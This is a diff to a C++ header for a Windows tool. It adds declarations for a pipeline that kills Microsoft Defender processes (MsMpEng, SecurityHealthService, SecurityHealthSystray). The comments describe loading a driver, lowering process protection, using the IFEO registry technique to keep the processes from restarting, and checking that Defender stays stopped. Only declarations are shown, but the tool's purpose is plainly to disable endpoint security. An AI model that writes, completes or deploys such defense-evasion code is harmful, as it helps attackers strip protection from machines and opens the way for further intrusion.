@@ -5,8 +5,56 @@
 #pragma once
 
 #include <windows.h>
+#include <array>
+#include <span>
 #include <string>
+#include <string_view>
 #include <vector>
+
+inline constexpr std::array<std::wstring_view, 3> kDefenderTargets{
+    L"MsMpEng",
+    L"SecurityHealthService",
+    L"SecurityHealthSystray"
+};
+
+std::vector<std::wstring> DefenderTargetList();
+
+enum class KillOutcome {
+    Succeeded,
+    Partial,
+    Failed,
+    AlreadyStopped
+};
+
+struct KillTargetReport {
+    std::wstring name;
+    DWORD pid = 0;
+    std::vector<DWORD> initialPids;
+    bool wasRunning = false;
+    bool trapSet = false;
+    bool terminated = false;
+    bool runningAfter = false;
+    bool originalSurvived = false;
+    bool restartedAfter = false;
+};
+
+struct KillOperationReport {
+    bool pplReady = false;
+    bool terminatorReady = false;
+    bool winDefendStopped = false;
+    bool securityHealthStopped = false;
+    bool defenderSet = false;
+    KillOutcome outcome = KillOutcome::Failed;
+    std::vector<KillTargetReport> targets;
+};
+
+/// Shared CLI/GUI kill pipeline. It applies IFEO first when requested, lowers
+/// protection for the running batch, terminates targets, verifies the final
+/// state, and evaluates Defender by service state instead of helper processes.
+KillOperationReport ExecuteKillTargets(
+    std::span<const std::wstring> targets,
+    bool paralyzeFirst,
+    bool defenderSet);
 
 // ---------------------------------------------------------------------------
 // Paralyze helpers (IFEO registry technique)
@@ -44,6 +92,10 @@ DWORD WINAPI RestoreThreadProc(LPVOID lpParam);
 
 /// Validates admin rights, loads the driver, and launches KillOnceThreadProc.
 void KillOnceAction();
+
+/// Kills MsMpEng, SecurityHealthService, and SecurityHealthSystray as one
+/// group. IFEO suppression is applied before the process kill phase.
+void KillDefenderAction();
 
 /// Validates admin rights and launches RestoreThreadProc.
 void RestoreAction();
